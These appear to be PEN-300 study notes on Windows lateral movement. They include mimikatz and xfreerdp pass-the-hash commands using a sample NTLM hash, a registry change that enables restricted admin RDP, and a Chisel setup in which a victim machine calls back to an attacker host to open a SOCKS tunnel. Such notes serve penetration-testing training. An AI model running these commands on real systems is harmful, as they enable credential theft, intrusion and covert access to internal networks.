# PEN-300 lataeral movement material

**There are only a few known lateral movement techniques against Windows that reuse stolen credentials such as PsExec, WMI, DCOM, and PSRemoting. Most of these techniques have been around for years and are [well known and weaponized]https://github.com/0xthirteen/SharpMove). Some require clear text credentials and others work with a password hash only. Typically, they all require local administrator access to the target machine.**

### mshtc.exe /Restrictedadmin (RDP)

RDP without credentials using **/restrictedadmin**.  This uses network credentials and not plaintext credentials.  

**Restricted admin mode is disabled by default, but the setting can be controlled through the DisableRestrictedAdmin registry entry at the following path:**

```registry
HKLM:\System\CurrentControlSet\Control\Lsa

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```

With restricted admin mode you can now PTH using RDP.  By using mimikatz to aquire and then /pth you can rdp as the stolen creds.

```mimikatz
privilege::debug

sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```

Can also PTH from XFREERDP as long as the host is reachable

```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

### Reverse RDP Proxying with Chisel

Setup
```
sudo apt install golang
git clone https://github.com/jpillora/chisel.git
```

Compile and generate linux version of ./chisel (for server)

```bash
cd chisel/
go build
```
<br><br>

Compile and generate windows version (from linux chisel folder)

```bash
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```
<br><br>

Start chisel in server mode, specify the listen port with -p and --socks5 to specify the SOCKS proxy mode.
Then SSH to yourself for some reason?

```
./chisel server -p 8080 --socks5
ssh -N -D 0.0.0.0:1080 localhost
```


Upload our chisel.exe to our victim and run it in client mode

```powershell
chisel.exe client KALIADDRESS:8080 socks
```

Then use proxychains to connect to hidden NAT network
```
sudo proxychains rdesktop 192.168.120.10
```

**We can also use chisel with the classic reverse SSH tunnel syntax by specifying the -reverse option instead of --socks5 on the server side.**
[https://0xdf.gitlab.io/cheatsheets/chisel](https://0xdf.gitlab.io/cheatsheets/chisel)



